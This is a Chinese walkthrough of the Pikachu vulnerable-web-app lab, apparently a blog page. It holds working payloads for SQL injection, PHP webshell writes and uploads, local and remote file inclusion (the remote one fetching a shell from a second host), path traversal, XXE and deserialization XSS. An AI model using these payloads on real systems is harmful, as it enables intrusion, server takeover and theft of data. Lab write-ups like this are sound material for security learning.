+<pre><code class="hljs lsl">$query=<span class="hljs-string">"insert into member(username,pw,sex,phonenum,email,address) values('&#123;$getdata['username']&#125;',md5('&#123;$getdata['password']&#125;'),'&#123;$getdata['sex']&#125;','&#123;$getdata['phonenum']&#125;','&#123;$getdata['email']&#125;','&#123;$getdata['add']&#125;')"</span>;
+
+values('&#123;$getdata[' <span class="hljs-number">1</span>'or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user()),<span class="hljs-number">0</span>) or' ']&#125;',
+输入框输入<span class="hljs-number">1</span>'or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user()),<span class="hljs-number">0</span>) or'
+
+<span class="hljs-number">1</span>'and updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,(select table_name from information_schema.tables where table_schema='pikachu' limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ),<span class="hljs-number">0</span>) or'获取表名
+<span class="hljs-number">1</span>'and updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,(select column_name from information_schema.columns where table_name='users' limit <span class="hljs-number">4</span>,<span class="hljs-number">1</span>) ),<span class="hljs-number">0</span>) or'获取列名
+<span class="hljs-number">1</span>'and updatexml(<span class="hljs-number">1</span>,concat( <span class="hljs-number">0x7e</span>,(select username from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ),<span class="hljs-number">0</span>) or'</code></pre>
+
+<p><a href="https://imgchr.com/i/s3CrkD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CrkD.png" srcset="/img/loading.gif" alt="s3CrkD.png"></a></p>
+<p><a href="https://imgchr.com/i/s3CNlR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CNlR.png" srcset="/img/loading.gif" alt="s3CNlR.png"></a></p>
+<h4 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h4><pre><code class="hljs angelscript"><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user()),<span class="hljs-number">0</span>)
+url编码
+<span class="hljs-number">102</span>+<span class="hljs-keyword">or</span>+updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user()),<span class="hljs-number">0</span>)</code></pre>
+
+<p><a href="https://imgchr.com/i/s3CyfH" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CyfH.png" srcset="/img/loading.gif" alt="s3CyfH.png"></a></p>
+<h4 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h4><p><a href="https://imgchr.com/i/s3Ccpd" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3Ccpd.png" srcset="/img/loading.gif" alt="s3Ccpd.png"></a></p>
+<pre><code class="hljs lsl"><span class="hljs-number">1</span>'or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user()),<span class="hljs-number">0</span>) or'</code></pre>
+
+<p>user-agent注入</p>
+<p><a href="https://imgchr.com/i/s3CFw8" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CFw8.png" srcset="/img/loading.gif" alt="s3CFw8.png"></a></p>
+<p>cookie处存在sql注入</p>
+<p><a href="https://imgchr.com/i/s3Cief" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3Cief.png" srcset="/img/loading.gif" alt="s3Cief.png"></a></p>
+<p><a href="https://imgchr.com/i/s3CCOP" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CCOP.png" srcset="/img/loading.gif" alt="s3CCOP.png"></a></p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><pre><code class="hljs applescript">kobe' <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(database())=<span class="hljs-number">7</span><span class="hljs-comment">#</span></code></pre>
+
+<p><a href="https://imgchr.com/i/s3CpQI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CpQI.png" srcset="/img/loading.gif" alt="s3CpQI.png"></a></p>
+<pre><code class="hljs lsl">lili' and ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">113</span>#</code></pre>
+
+<p>查询成功返回数据</p>
+<p><a href="https://imgchr.com/i/s3C9yt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3C9yt.png" srcset="/img/loading.gif" alt="s3C9yt.png"></a></p>
+<pre><code class="hljs lsl">lili' and ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">113</span>#</code></pre>
+
+<p>不满足条件，查询失败</p>
+<p><a href="https://imgchr.com/i/s3CkTS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CkTS.png" srcset="/img/loading.gif" alt="s3CkTS.png"></a></p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>查看源代码</p>
+<p><a href="https://imgchr.com/i/s3CEFg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CEFg.png" srcset="/img/loading.gif" alt="s3CEFg.png"></a></p>
+<pre><code class="hljs pgsql">kob<span class="hljs-string">e' and if((length(database())=7),sleep(5),1)#</span>
+<span class="hljs-string">如果当前数据库长度为7，等待5s返回结果。反之立即返回结果。</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">kobe'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">7</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)#</code></pre>
+
+<p><a href="https://imgchr.com/i/s3CVYQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CVYQ.png" srcset="/img/loading.gif" alt="s3CVYQ.png"></a></p>
+<pre><code class="hljs pgsql">kob<span class="hljs-string">e' and if((substr(database(),1,1))='</span>p<span class="hljs-string">',sleep(5),null)#</span>
+<span class="hljs-string">如果正确，等待5s返回结果。</span></code></pre>
+
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><blockquote>
+<p>宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\也就是％5c中变成了一个汉字“运”，而“逃逸了出来。</p>
+</blockquote>
+<p>post注入，抓包改包进行注入</p>
+<pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">df</span></span>' and 1=1#</code></pre>
+
+<p><a href="https://imgchr.com/i/s3CZWj" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CZWj.png" srcset="/img/loading.gif" alt="s3CZWj.png"></a></p>
+<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><pre><code class="hljs pgsql">kob<span class="hljs-string">e' union select "&lt;?php @eval($_GET['</span>test<span class="hljs-string">'])&gt;",2 into outfile "/var/www/html/1.php"</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">kobe'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> "&lt;?php system($_GET['cmd'])&gt;",<span class="hljs-number">2</span> <span class="hljs-keyword">into</span> outfile "/var/www/html/1.php"</code></pre>
+
+<h4 id="sql之暴力破解"><a href="#sql之暴力破解" class="headerlink" title="sql之暴力破解"></a>sql之暴力破解</h4><pre><code class="hljs pgsql">kob<span class="hljs-string">e' and exists(select * from aa)#</span>
+<span class="hljs-string">暴力破解表名，aa为变量。可替换为字典。</span>
+<span class="hljs-string">kobe'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> users)#
+暴力破解列名，id为变量。</code></pre>
+
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>“|”:管道符，前面命令标准输出，后面命令的标准输入。例如：help |more</p>
+<p>“&amp;” commandA &amp; commandB 先运行命令A然后运行命令B</p>
+<p>“||” commandA || commandB 运行命令A，如果失败则运行命令B</p>
+<p>“&amp;&amp;” commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><pre><code class="hljs llvm">http://<span class="hljs-number">192.168</span>.<span class="hljs-number">2.137</span>:<span class="hljs-number">8000</span>/vul/fileinclude/fi_local.php?filename=../../../../../etc/passwd&amp;submit=<span class="hljs-symbol">%E6</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%90</span><span class="hljs-symbol">%E4</span><span class="hljs-symbol">%BA</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%E6</span><span class="hljs-symbol">%9</span>F<span class="hljs-symbol">%A5</span><span class="hljs-symbol">%E8</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%A2</span></code></pre>
+
+<p><a href="https://imgchr.com/i/s3Cnln" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3Cnln.png" srcset="/img/loading.gif" alt="s3Cnln.png"></a></p>
+<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>在本地使用phpstudy快速搭建服务。</p>
+<pre><code class="hljs mel">&lt;?php
+$myfile = <span class="hljs-keyword">fopen</span>(<span class="hljs-string">"yijuhua.php"</span>,<span class="hljs-string">"w"</span>);
+$txt=<span class="hljs-string">'&lt;?php system($_GET[x]);?&gt;'</span>;
+<span class="hljs-keyword">fwrite</span>($myfile,$txt);
+<span class="hljs-keyword">fclose</span>($myfile);
+?&gt;</code></pre>
+
+<p><a href="https://imgchr.com/i/s3H51U" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3H51U.png" srcset="/img/loading.gif" alt="s3H51U.png"></a></p>
+<p>从皮卡丘靶机文件包处访问本地搭建的文件。实现远程文件包含漏洞利用。</p>
+<pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.137</span>:<span class="hljs-number">8000</span>/vul/fileinclude/fi_remote.php?filename=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span>/yijuhua.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2<span class="hljs-comment">#</span></code></pre>
+
+<blockquote>
+<p>warning:你的allow_url_include没有打开,请在php.ini中打开了再测试该漏洞,记得修改后,重启中间件服务!</p>
+</blockquote>
+<pre><code class="hljs routeros">vi /etc/php/7.4/apache2/php.ini 
+service apache2 restart</code></pre>
+
+<p><a href="https://imgchr.com/i/s3CmSs" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3CmSs.png" srcset="/img/loading.gif" alt="s3CmSs.png"></a></p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.137</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/vul/</span>fileinclude<span class="hljs-regexp">/yijuhua.php?x=whoami</span></code></pre>
+
+<p><a href="https://imgchr.com/i/s3HLA1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/11/s3HLA1.png" srcset="/img/loading.gif" alt="s3HLA1.png"></a></p>
+<h3 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h3><blockquote>
+<p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br> 此时如果攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。<br> 所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！ </p>
+</blockquote>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.137</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/vul/u</span>nsafedownload<span class="hljs-regexp">/execdownload.php?filename=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/passwd</span></code></pre>
+
+<p>一开始链接写错了，不是在url上修改，而是复制图片的下载链接进行修改。</p>
+<p><a href="https://imgchr.com/i/sGvgr6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvgr6.png" srcset="/img/loading.gif" alt="sGvgr6.png"></a></p>
+<h3 id="不安全的文件上传"><a href="#不安全的文件上传" class="headerlink" title="不安全的文件上传"></a>不安全的文件上传</h3><blockquote>
+<p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断。比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。</p>
+<p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>–等等…</p>
+</blockquote>
+<h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><p>上传一句话木马，修改文件后缀为图片，</p>
+<pre><code class="hljs xml">一句话木马
+<span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'shell'</span>]);<span class="hljs-meta">?&gt;</span></span></code></pre>
+
+<p>抓包，修改为php。上传成功。</p>
+<p><a href="https://imgchr.com/i/sGvyx1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvyx1.png" srcset="/img/loading.gif" alt="sGvyx1.png"></a></p>
+<p>蚁剑连接成功</p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.137</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/vul/u</span>nsafeupload<span class="hljs-regexp">/uploads/yi</span>juhua.php</code></pre>
+
+<p><a href="https://imgchr.com/i/sGvDPJ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvDPJ.png" srcset="/img/loading.gif" alt="sGvDPJ.png"></a></p>
+<h4 id="MIME-type（在后端进行了文件类型的比对）"><a href="#MIME-type（在后端进行了文件类型的比对）" class="headerlink" title="MIME type（在后端进行了文件类型的比对）"></a>MIME type（在后端进行了文件类型的比对）</h4><p>通过改包仍能绕过该验证。</p>
+<h4 id="getimagesize-string-filename-函数校验"><a href="#getimagesize-string-filename-函数校验" class="headerlink" title="getimagesize(string filename) 函数校验"></a>getimagesize(string filename) 函数校验</h4><blockquote>
+<p>getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p>
+<p>这种类型后台会根据上传的图片的16进制格式的前几位进行对比 符合才是真的图片，例如PNG的前几位是：8950 4e47 </p>
+</blockquote>
+<pre><code class="hljs phpinfo.php">&lt;?php phpinfo();?&gt;</code></pre>
+
+<p>选择一张图片和一个一句话木马文件生成图片马</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">cat</span> 3<span class="hljs-selector-tag">d810b4bafa046ce1595b5e45b3ddb71_t</span><span class="hljs-selector-class">.gif</span> <span class="hljs-selector-tag">phpinfo</span><span class="hljs-selector-class">.php</span> &gt;&gt; <span class="hljs-selector-tag">phpinfo</span><span class="hljs-selector-class">.png</span></code></pre>
+
+<p><code>xxd xx.png</code>查看图片的16进制</p>
+<p>文件上传地址<code>uploads/2020/12/31/3457565fed400bf185b559031204.png</code></p>
+<p>利用文件包含漏洞执行图片中的恶意代码。include函数执行发生发生错误时会继续执行。</p>
+<pre><code class="hljs llvm">http://<span class="hljs-number">192.168</span>.<span class="hljs-number">2.137</span>:<span class="hljs-number">8000</span>/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/<span class="hljs-number">2020</span>/<span class="hljs-number">12</span>/<span class="hljs-number">31</span>/<span class="hljs-number">3457565</span>fed<span class="hljs-number">400</span>bf<span class="hljs-number">185</span>b<span class="hljs-number">559031204</span>.png&amp;submit=<span class="hljs-symbol">%E6</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%90</span><span class="hljs-symbol">%E4</span><span class="hljs-symbol">%BA</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%E6</span><span class="hljs-symbol">%9</span>F<span class="hljs-symbol">%A5</span><span class="hljs-symbol">%E8</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%A2</span></code></pre>
+
+<p><a href="https://imgchr.com/i/sGvcKx" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvcKx.png" srcset="/img/loading.gif" alt="sGvcKx.png"></a></p>
+<h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><blockquote>
+<p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。<br>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。<br>因此，在在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p>
+</blockquote>
+<h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p><strong>相同权限越权</strong></p>
+<p>使用lili/123546登陆查看信息，</p>
+<p><a href="https://imgchr.com/i/sGvrG9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvrG9.png" srcset="/img/loading.gif" alt="sGvrG9.png"></a></p>
+<p>尝试修改url中<code>username</code>为kobe，未登录即可查看kobe个人信息。</p>
+<p><a href="https://imgchr.com/i/sGv2qK" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGv2qK.png" srcset="/img/loading.gif" alt="sGv2qK.png"></a></p>
+<p>完成水平越权</p>
+<h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p><strong>不同权限越权</strong>，普通用户越权操作管理员的情况。</p>
+<p>验证逻辑，首先使用管理员账户添加用户，抓取添加用户的数据包。</p>
+<p>然后使用普通用户重放数据包，查看能否添加用户。</p>
+<p>使用pikachu账户登录，只有查看权限</p>
+<p><a href="https://imgchr.com/i/sGvWVO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvWVO.png" srcset="/img/loading.gif" alt="sGvWVO.png"></a></p>
+<p>使用管理员登录创建test账户，抓包</p>
+<p><a href="https://imgchr.com/i/sGvfaD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvfaD.png" srcset="/img/loading.gif" alt="sGvfaD.png"></a></p>
+<p>管理员退出登录，使用普通用户登录。抓包获取普通用户cookie</p>
+<pre><code class="hljs gcode">Cookie: PHPSESSID=<span class="hljs-attr">vcrjce61</span><span class="hljs-name">g255</span><span class="hljs-keyword">eq</span><span class="hljs-number">50</span>t<span class="hljs-number">0</span>jqj<span class="hljs-meta">o2</span>j<span class="hljs-number">5</span>b</code></pre>
+
+<p>修改添加用户数据包重放。</p>
+<p><a href="https://imgchr.com/i/sGvhIe" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvhIe.png" srcset="/img/loading.gif" alt="sGvhIe.png"></a></p>
+<p>刷新查看，普通用户成功创建账户</p>
+<p><a href="https://imgchr.com/i/sGv5PH" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGv5PH.png" srcset="/img/loading.gif" alt="sGv5PH.png"></a></p>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><blockquote>
+<p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。<br>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。<br>需要区分一下的是,如果你通过不带参数的url（比如：<a href="http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。" target="_blank" rel="noopener">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。</a> 而并不归为目录遍历漏洞。</p>
+</blockquote>
+<p><a href="https://imgchr.com/i/sGvoRA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvoRA.png" srcset="/img/loading.gif" alt="sGvoRA.png"></a></p>
+<h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><pre><code class="hljs ada">由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：
+<span class="hljs-comment">---通过访问url下的目录，可以直接列出目录下的文件列表;</span>
+<span class="hljs-comment">---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;</span>
+<span class="hljs-comment">---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</span>
+类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。</code></pre>
+
+<p>输入账号密码，账号密码在url处明文显示。</p>
+<h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p><strong>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</strong></p>
+<blockquote>
+<p>序列化说通俗点就是把一个对象变成可以传输的字符串。</p>
+<pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">S</span>&#123;
+    <span class="hljs-keyword">public</span> $test=<span class="hljs-string">"pikachu"</span>;
+&#125;
+$s=new S(); <span class="hljs-comment">//创建一个对象</span>
+serialize($s); <span class="hljs-comment">//把这个对象进行序列化</span>
+序列化后得到的结果是这个样子的:O:<span class="hljs-number">1</span>:<span class="hljs-string">"S"</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">"pikachu"</span>;&#125;
+    O:代表object
+    <span class="hljs-number">1</span>:代表对象名字长度为一个字符
+    S:对象的名称
+    <span class="hljs-number">1</span>:代表对象里面有一个变量
+    s:数据类型
+    <span class="hljs-number">4</span>:变量名称的长度
+    test:变量名称
+    s:数据类型
+    <span class="hljs-number">7</span>:变量值的长度
+    pikachu:变量值
+</code></pre>
+
+<p>反序列化就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
+</blockquote>
+<pre><code class="hljs sqf">常见的几个魔法函数:
+<span class="hljs-variable">__construct</span>()当一个对象创建时被调用
+<span class="hljs-variable">__destruct</span>()当一个对象销毁时被调用
+<span class="hljs-variable">__toString</span>()当一个对象被当作一个字符串使用
+<span class="hljs-variable">__sleep</span>() 在对象在被序列化之前运行
+<span class="hljs-variable">__wakeup</span>将在序列化之后立即被调用</code></pre>
+
+<p>如何构造payload</p>
+<p>搭建一个站点。</p>
+<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;</span>
+<span class="php">		<span class="hljs-keyword">var</span> $test = <span class="hljs-string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>;</span>
+<span class="php">&#125;</span>
+<span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br&gt;'</span>;</span>
+<span class="php">$a = <span class="hljs-keyword">new</span> S();</span>
+<span class="php"><span class="hljs-keyword">echo</span> serialize($a);</span>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre>
+
+<p>访问出现弹窗</p>
+<p><a href="https://imgchr.com/i/sGvIGd" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvIGd.png" srcset="/img/loading.gif" alt="sGvIGd.png"></a></p>
+<p>查看源代码，获得反序列化后的内容</p>
+<pre><code class="hljs css">&lt;<span class="hljs-selector-tag">br</span>&gt;<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"S"</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">25</span>:<span class="hljs-string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>;&#125;</code></pre>
+
+<p><a href="https://imgchr.com/i/sGvTxI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvTxI.png" srcset="/img/loading.gif" alt="sGvTxI.png"></a></p>
+<p>提交payload：<code>O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:25:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;}</code></p>
+<p><a href="https://imgchr.com/i/sGvHMt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvHMt.png" srcset="/img/loading.gif" alt="sGvHMt.png"></a></p>
+<h3 id="XXE-xml外部实体注入漏洞"><a href="#XXE-xml外部实体注入漏洞" class="headerlink" title="XXE-xml外部实体注入漏洞"></a>XXE-xml外部实体注入漏洞</h3><blockquote>
+<p>XXE既”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>
+<p>具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p>
+</blockquote>
+<p>外部引用可以支持http，file，ftp等协议。</p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version ="1.0"?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span>
+<span class="hljs-meta">		<span class="hljs-meta">&lt;!ENTITY f <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span>&gt;</span></span>
+<span class="hljs-meta">]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span></code></pre>
+
+<p><a href="https://imgchr.com/i/sGvqqf" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/12/sGvqqf.png" srcset="/img/loading.gif" alt="sGvqqf.png"></a></p>
+<h3 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h3><blockquote>
+<p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话<br>就可能发生”跳错对象”的问题。</p>
+<p>url跳转比较直接的危害是:<br>–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p>
+</blockquote>
+<pre><code class="hljs crystal"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.2.137:8000/vul</span><span class="hljs-regexp">/urlredirect/urlredirect</span>.php?url=i
+url修改为<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/www.baidu.com/</span>
